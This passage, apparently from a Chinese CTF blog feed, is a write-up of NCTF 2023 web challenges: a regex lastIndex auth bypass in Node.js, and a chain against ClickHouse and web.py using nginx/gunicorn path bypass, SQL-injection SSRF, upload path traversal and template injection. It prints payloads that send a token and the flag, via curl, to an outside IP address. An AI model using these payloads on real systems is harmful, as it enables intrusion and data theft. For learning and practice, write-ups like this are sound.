password.length &gt; <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;密码不合法&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (username in users) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;用户已存在&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(let existing_user in users)&#123;</span><br><span class="line">        <span class="type">let</span> <span class="variable">existing_user_password</span> <span class="operator">=</span> users[existing_user]</span><br><span class="line">        <span class="keyword">if</span> (existing_user_password === password)&#123;</span><br><span class="line">            <span class="keyword">return</span> `您的密码已经被用户<span class="string">&#x27;$&#123;existing_user&#125;&#x27;</span>使用了，请使用其它的密码`</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    users[username] = password</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;注册成功&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(express.<span class="keyword">static</span>(<span class="string">&#x27;public&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每次请求前，更新封禁用户正则信息</span></span><br><span class="line">app.use(function (req, res, next) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        build_banned_users_regex()</span><br><span class="line">console.log(<span class="string">&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;</span>,banned_users_regex)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/api/register&quot;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">username</span> <span class="operator">=</span> req.body.username</span><br><span class="line">    <span class="type">let</span> <span class="variable">password</span> <span class="operator">=</span> req.body.password</span><br><span class="line">    <span class="type">let</span> <span class="variable">message</span> <span class="operator">=</span> registerUser(username, password)</span><br><span class="line">    res.send(message)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/api/login&quot;</span>, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    res.send(<span class="string">&quot;登录成功！&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/api/flag&quot;</span>, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">username</span> <span class="operator">=</span> req.body.username</span><br><span class="line">    <span class="title function_">if</span> <span class="params">(username !== <span class="string">&quot;admin&quot;</span>)</span> &#123;</span><br><span class="line">        res.send(<span class="string">&quot;登录成功，但是只有&#x27;admin&#x27;用户可以看到flag，你的用户名是&#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">let</span> <span class="variable">flag</span> <span class="operator">=</span> child_process.execSync(<span class="string">&quot;cat flag&quot;</span>).toString()</span><br><span class="line">    res.end(flag)</span><br><span class="line">    console.error(<span class="string">&quot;有人获取到了flag！为了保证题目的正常运行，将会重置靶机环境！&quot;</span>)</span><br><span class="line">    res.on(<span class="string">&quot;finish&quot;</span>, () =&gt; &#123;</span><br><span class="line">        setTimeout(() =&gt; &#123; process.exit(<span class="number">0</span>) &#125;, <span class="number">1</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/api/ban_user&#x27;</span>, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">username</span> <span class="operator">=</span> req.body.username</span><br><span class="line">    <span class="type">let</span> <span class="variable">ban_username</span> <span class="operator">=</span> req.body.ban_username</span><br><span class="line">    <span class="title function_">if</span><span class="params">(!ban_username)</span>&#123;</span><br><span class="line">        res.send(<span class="string">&quot;ban_username不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(username === ban_username)&#123;</span><br><span class="line">        res.send(<span class="string">&quot;不能封禁自己&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (let name of banned_users)&#123;</span><br><span class="line">        <span class="keyword">if</span> (name === ban_username) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;用户已经被封禁&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    banned_users.push(ban_username)</span><br><span class="line">    res.send(<span class="string">&quot;封禁成功！&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.redirect(<span class="string">&quot;/static/index.html&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`listening on port $&#123;port&#125;`)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>最主要的逻辑代码是鉴权中间件这块</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//鉴权中间件</span></span><br><span class="line">function <span class="title function_">requireLogin</span><span class="params">(req, res, next)</span> &#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">username</span> <span class="operator">=</span> req.body.username</span><br><span class="line">    <span class="type">let</span> <span class="variable">password</span> <span class="operator">=</span> req.body.password</span><br><span class="line">    <span class="title function_">if</span> <span class="params">(!username || !password)</span> &#123;</span><br><span class="line">        res.send(<span class="string">&quot;用户名或密码不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (typeof username !== <span class="string">&quot;string&quot;</span> || typeof password !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        res.send(<span class="string">&quot;用户名或密码不合法&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 基于正则技术的封禁用户匹配系统的设计与实现</span></span><br><span class="line">    <span class="type">let</span> <span class="variable">test1</span> <span class="operator">=</span> banned_users_regex.test(username)</span><br><span class="line">    console.log(`使用正则$&#123;banned_users_regex&#125;匹配$&#123;username&#125;的结果为：$&#123;test1&#125;`)</span><br><span class="line">    <span class="keyword">if</span> (test1) &#123;</span><br><span class="line">console.log(<span class="string">&quot;第一个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.send(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 基于in关键字的封禁用户匹配系统的设计与实现</span></span><br><span class="line">    <span class="type">let</span> <span class="variable">test2</span> <span class="operator">=</span> (username in banned_users)</span><br><span class="line">    console.log(`使用in关键字匹配$&#123;username&#125;的结果为：$&#123;test2&#125;`)</span><br><span class="line">    <span class="keyword">if</span> (test2)&#123;</span><br><span class="line">        console.log(<span class="string">&quot;第二个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.send(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (username in users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">        next()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">&quot;用户名或密码错误，鉴权失败！&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们想拿到flag 就需要鉴权以admin身份登录 但是每次鉴权之前<code>banned_users.push(&quot;admin&quot;)</code>都会执行这条语句把admin给ban了 无法以admin身份登录</p><p>test1是关于正则的鉴权，来看看正则</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">escapeRegExp</span><span class="params">(string)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> string.replace(/[.*+?^$&#123;&#125;()|[\]\\]/g, <span class="string">&#x27;\\$&amp;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">/.../</span><br><span class="line"><span class="type">let</span> <span class="variable">banned_users_regex</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">function <span class="title function_">build_banned_users_regex</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">let</span> <span class="variable">regex_string</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (let username of banned_users) &#123;</span><br><span class="line">        regex_string += <span class="string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="string">&quot;$&quot;</span> + <span class="string">&quot;|&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.substring(<span class="number">0</span>, regex_string.length - <span class="number">1</span>)</span><br><span class="line">    banned_users_regex = <span class="keyword">new</span> <span class="title class_">RegExp</span>(regex_string, <span class="string">&quot;g&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遍历封禁用户的数组，以<code>^admin$|^hacker$|</code>的形式，用g全局匹配返回一个正则表达式</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707124205087-85881633-48f1-4609-8e34-bfb92bb68ee1.png" alt="img"></p><p>这里有一个trick就是RegExp.lastIndex的使用，当它开启g属性的时候，lastIndex会起作用，它用于表示从哪一个位置开始进行匹配</p><p>有两种情况：</p><ol><li>当regexp.test匹配成功，lastIndex会被设置为最近匹配成功的下一个位置</li><li>当regexp.test匹配失败，lastIndex被设置为0</li></ol><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707121981909-234a9ea1-a03d-4e81-a0a2-522f4dce4a15.png" alt="img"></p><p>那么第一段鉴权：</p><p>每次请求都会通过<code>build_banned_users_regex()</code>生成一个新的正则表达式使得每次匹配都从<code>lastIndex=0</code>开始，如果能够在第一次匹配到admin使得lastIndex索引变成5之后，第二次没有生成新的就匹配，那么就成功绕过了第一层的鉴权，而这里是使用try-catch进行处理的，即使抛出异常，程序也不会中断。所以可以使用其它类型的ban_username，就会抛出TypeError异常，从而不生成新的lastIndex，绕过第一层。</p><p>再来看test2 其实这里<code>in</code>关键字只存在于python </p><p>而在js中的用法：用于检查对象是否具有指定属性或者原型链中是否存在指定的属性</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707122445762-5cb47def-f2d2-4f76-953f-c517b62e3caa.png" alt="img"></p><p>由于 banned_users 为 Array 类型，不存在 admin 属性，因此 test2 实际上判断的是banned_users中是否存在数组索引为username的值（由于对象的属性名称会被隐式转换为字符串，”0”和0都可以作为数组索引）</p><p>现在的问题是每次在请求时都会创建一个新的 <code>banned_users_regex</code> ，恢复其 <code>lastIndex</code> 位置为初始值0</p><p>如果我们能在新的regex对象赋值之前，抛出异常来绕过 regex 的更新，那么就可以了</p><p>传入 <code>escapeRegExp(string)</code> 函数中的 string 参数为非字符串类型</p><p>则string不存在 replace 属性，会抛出TypeError，以此来绕过 regex 的更新</p><p>首先我们注册一个账号然后使用封禁路由</p><p>push一个对象类型，此时就会报错抛异常，bypass lastIndex的重制</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707124557396-8dc09cd8-a765-4813-80e4-7d1d5adedc6e.png" alt="img"></p><p>然后用admin登录 第一次会被正则到使得lastIndex为5</p><p>第二次admin登录则不会被正则 此时从第五个字符开始正则</p><p>调试可以观察到：</p><p>这次的<code>banned_users_regex.lastIndex</code>并没有被重制</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707124883100-619e262c-02dd-44cc-8458-51e6173dcee2.png" alt="img"></p><p>第二次登录就会拿到flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707125921213-d9589dd6-2f9a-44e2-83d1-a5061d8aa74b.png" alt="img"></p><h1 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h1><p>环境不太对劲 wpscan扫出来的洞和其他师傅wp不一样 太诡异了 可能是我自己环境搭的有问题。。。</p><p>是phar+文件上传+ssrf的组合拳</p><p>可看X1r0z师傅的官方wp<a href="https://hackforfun.feishu.cn/wiki/VkHiwiuHziepynkZuGlcp0fEnTd">https://hackforfun.feishu.cn/wiki/VkHiwiuHziepynkZuGlcp0fEnTd</a></p><h1 id="EvilMQ"><a href="#EvilMQ" class="headerlink" title="EvilMQ"></a>EvilMQ</h1><p>先等等</p><h1 id="house-of-click"><a href="#house-of-click" class="headerlink" title="house of click"></a>house of click</h1><p>搭环境这里遇到了问题，有时候<code>docker-compose up -d</code>会报错，拉不到镜像，这里建议换源清华的镜像可以解决这个问题</p><p>这个题就是纯是学习了 压根没见过</p><p>给了源码：</p><p>可以看到是有四个路由的但是进入题目环境之后只有nginx的页面 也访问不到路由</p><p>大致看源码思路就是通过sql注入拿到token，然后再拿着token去文件上传，然后文件上传也有路径穿越因为直接通过os.path.join拼接文件名，穿越到模板文件目录直接访问index进行ssti。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> clickhouse_connect</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">import</span> web</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">with <span class="title function_">open</span><span class="params">(<span class="string">&#x27;.token&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span> as f:</span><br><span class="line">    TOKEN = f.read()</span><br><span class="line"></span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;Index&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/query&#x27;</span>, <span class="string">&#x27;Query&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/api/ping&#x27;</span>, <span class="string">&#x27;Ping&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/api/token&#x27;</span>, <span class="string">&#x27;Token&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/api/upload&#x27;</span>, <span class="string">&#x27;Upload&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">render = web.template.render(<span class="string">&#x27;templates/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">check_ip</span><span class="params">(ip, ip_range)</span>:</span><br><span class="line">    <span class="keyword">return</span> ipaddress.ip_address(ip) in ipaddress.ip_network(ip_range)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Index</span>:</span><br><span class="line">    def <span class="title function_">GET</span><span class="params">(self)</span>:</span><br><span class="line">        <span class="keyword">return</span> render.index()</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">POST</span><span class="params">(self)</span>:</span><br><span class="line">        data = web.input(name=<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> render.__getattr__(data.name)()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Query</span>:</span><br><span class="line">    def <span class="title function_">POST</span><span class="params">(self)</span>:</span><br><span class="line">        data = web.input(id=<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        client = clickhouse_connect.get_client(host=<span class="string">&#x27;db&#x27;</span>, port=<span class="number">8123</span>, username=<span class="string">&#x27;default&#x27;</span>, password=<span class="string">&#x27;default&#x27;</span>)</span><br><span class="line">        sql = <span class="string">&#x27;SELECT * FROM web.users WHERE id = &#x27;</span> + data.id</span><br><span class="line">        client.command(sql)</span><br><span class="line">        client.close()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ping</span>:</span><br><span class="line">    def <span class="title function_">GET</span><span class="params">(self)</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;pong&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Token</span>:</span><br><span class="line">    def <span class="title function_">GET</span><span class="params">(self)</span>:</span><br><span class="line">        ip = web.ctx.env.get(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> not <span class="title function_">check_ip</span><span class="params">(ip, <span class="string">&#x27;172.28.0.0/16&#x27;</span>)</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;forbidden&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> TOKEN</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Upload</span>:</span><br><span class="line">    def <span class="title function_">POST</span><span class="params">(self)</span>:</span><br><span class="line">        ip = web.ctx.env.get(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>)</span><br><span class="line">        token = web.ctx.env.get(<span class="string">&#x27;HTTP_X_ACCESS_TOKEN&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> not <span class="title function_">check_ip</span><span class="params">(ip, <span class="string">&#x27;172.28.0.0/16&#x27;</span>)</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;forbidden&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> token != TOKEN:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;unauthorized&#x27;</span></span><br><span class="line">    </span><br><span class="line">        files = web.input(myfile=&#123;&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;myfile&#x27;</span> in files:</span><br><span class="line">            filepath = os.path.join(<span class="string">&#x27;upload/&#x27;</span>, files.myfile.filename)</span><br><span class="line">            <span class="keyword">if</span> (os.path.isfile(filepath)):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            with <span class="title function_">open</span><span class="params">(filepath, <span class="string">&#x27;wb&#x27;</span>)</span> as f:</span><br><span class="line">                f.write(files.myfile.file.read())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = web.application(urls, globals())</span><br><span class="line">application = app.wsgifunc(web.httpserver.StaticMiddleware)</span><br></pre></td></tr></table></figure><p>根据X1r0z师傅的WP</p><p>思路:</p><ol><li>nginx + gunicorn 路径绕过</li><li>ClickHouse SQL 盲注打 SSRF</li><li>web.py 上传时的目录穿越 + Templetor SSTI 实现 RCE</li></ol><p>首先是nginx + gunicorn 路径绕过</p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/yDIMgXltVLNfslVGg9lt4g">https://mp.weixin.qq.com/s/yDIMgXltVLNfslVGg9lt4g</a></p><p><a href="https://github.com/CHYbeta/OddProxyDemo/blob/master/nginx/demo1/README.md">https://github.com/CHYbeta/OddProxyDemo/blob/master/nginx/demo1/README.md</a></p><p>首先需要知道什么是gunicorn 直接拷打gpt</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707369999289-a775c507-85fa-496d-9374-37e6658e0fbf.png" alt="img"></p><p>payload：<code>POST /queryHTTP/1.1/../../api/ping HTTP/1.1</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707370146347-676e2ecc-fe64-4993-bc27-baa9d5f44346.png" alt="img"></p><p>发现query路由下存在sql注入，不过这里不是mysql了，而是clickhouse数据库</p><p>接下来是ssrf</p><p>查阅官方文档发现有个url函数<a href="https://clickhouse.com/docs/zh/sql-reference/table-functions/url">https://clickhouse.com/docs/zh/sql-reference/table-functions/url</a></p><p>发送post请求上传文件需要insert，这里没法进行堆叠注入</p><p>clickhouse自己有个HTTP Interface 通过它可以实现GET请求insert语句</p><p>先ssrf自身的HTTP interface然后再去ssrf到backend<a href="https://clickhouse.com/docs/zh/interfaces/http">https://clickhouse.com/docs/zh/interfaces/http</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> url(<span class="string">&#x27;http://default:default@db:8123/?query=&lt;SQL&gt;&#x27;</span>, <span class="string">&#x27;TabSeparatedRaw&#x27;</span>, <span class="string">&#x27;x String&#x27;</span>))</span><br></pre></td></tr></table></figure><p><code>TabSeparatedRaw</code>表示返回的数据采用制表符分隔的原始数据格式</p><p><code>x String</code>表示外部查询返回的数据类型为字符串</p><p>接下里的思路就是先select拿到token然后套一个url函数将token编码后外带</p><p>接着insert发送post请求上传文件到backend</p><p>index留了POST方法用于渲染其他模板 就可以通过路径穿越将文件上传至templates目录然后 render这个模板 实现SSTI</p><h2 id="拿token"><a href="#拿token" class="headerlink" title="拿token"></a>拿token</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> AND (SELECT * FROM <span class="title function_">url</span><span class="params">(<span class="string">&#x27;http://124.221.177.174:6666/?a=&#x27;</span>||hex((select * FROM url(<span class="string">&#x27;http://backend:8001/api/token&#x27;</span>, <span class="string">&#x27;TabSeparatedRaw&#x27;</span>, <span class="string">&#x27;x String&#x27;</span>)</span>)), <span class="string">&#x27;TabSeparatedRaw&#x27;</span>, <span class="string">&#x27;x String&#x27;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707376834751-532d80ef-7f64-407e-b1cb-0a02b632e546.png" alt="img"></p><p>拿到token：<code>38ad6332afaa1e3fc75f6a6b60cdd909</code></p><h2 id="insert上传文件"><a href="#insert上传文件" class="headerlink" title="insert上传文件"></a>insert上传文件</h2><p>payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> and (select * from <span class="title function_">url</span><span class="params">(<span class="string">&#x27;http://172.16.106.1:8123/?query=insert into function url(&#x27;</span>http://backend:<span class="number">8001</span>/api/upload<span class="string">&#x27;,&#x27;</span>TabSeparatedRaw<span class="string">&#x27;, &#x27;</span>a String<span class="string">&#x27;,headers(&#x27;</span>Content-Type<span class="string">&#x27;=&#x27;</span>multipart/form-data; boundary=----test<span class="string">&#x27;,&#x27;</span>X-Access-Token<span class="string">&#x27;=&#x27;</span>38ad6332afaa1e3fc75f6a6b60cdd909<span class="string">&#x27;)) Values(&#x27;</span> ------test\r\nContent-Disposition: form-data; name=<span class="string">&quot;myfile&quot;</span>; filename=<span class="string">&quot;../templates/exp.html&quot;</span>\r\nContent-Type: text/plain\r\n\r\n$code:\r\n__import__(\<span class="string">&#x27;os\&#x27;).system(\&#x27;curl http://124.221.177.174:7777/?flag=`/readflag | base64`\&#x27;)\r\n------test--&#x27;</span>)</span>;<span class="string">&#x27;,CSV,&#x27;</span>a String<span class="string">&#x27;))</span></span><br></pre></td></tr></table></figure><p>内容是最简洁的上传一个文件的请求头和请求体</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707381987765-4e279843-4651-4623-9841-cefbcfc80f1d.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707379693762-a99cbe8a-b338-4536-8eb6-deed6aa0d94b.png" alt="img"></p><p>可见我们的文件已经被上传了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707379874775-1c1c6f97-3ae0-4d60-8ef0-7c94077970c6.png" alt="img"></p><p>这里需要注意的是后端接受表单的名称为myfile而不是file，还有就是根据给的附件nginx.conf上传upload时候nginx反向代理location内网端口为8001</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707380679253-5f329d9f-1471-4ea2-a0af-a5d2bfe7c93c.png" alt="img"></p><p>接着到index render test.html实现RCE</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707380332237-2d15b9a6-f885-44ab-9f3e-12e79705204b.png" alt="img"></p><p>拿到flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707380341369-b800c902-c363-4399-8a25-01209b02088f.png" alt="img"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>做X1r0z师傅出的题总能学到不少知识，而且赛后还给复现环境的dockerfile，很难不爱！！</p><p>看官方文档的能力真的很重要，基本功同样重要！！！</p><p>java继续探索！</p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#logging">https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#logging</a></p><p>[<a href="https://boogipop.com/2023/12/28/NCTF%202023%20Web%20Writeup(Post-Match)/#house-of-click]">https://boogipop.com/2023/12/28/NCTF%202023%20Web%20Writeup(Post-Match)/#house-of-click]</a>(<a href="https://boogipop.com/2023/12/28/NCTF">https://boogipop.com/2023/12/28/NCTF</a> 2023 Web Writeup(Post-Match)&#x2F;#house-of-click)</p><p><a href="https://xz.aliyun.com/t/13536?time__1311=mqmxnQiQi=FqlxGgpDyeXvB+DIOxGwD&alichlgref=https://xz.aliyun.com/t/13536#toc-4">https://xz.aliyun.com/t/13536?time__1311=mqmxnQiQi%3DFqlxGgpDyeXvB%2BDIOxGwD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F13536#toc-4</a></p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第六届安洵杯WEB赛后解题</title>
      <link href="/post/c4db13dc.html"/>
      <url>/post/c4db13dc.html</url>
      
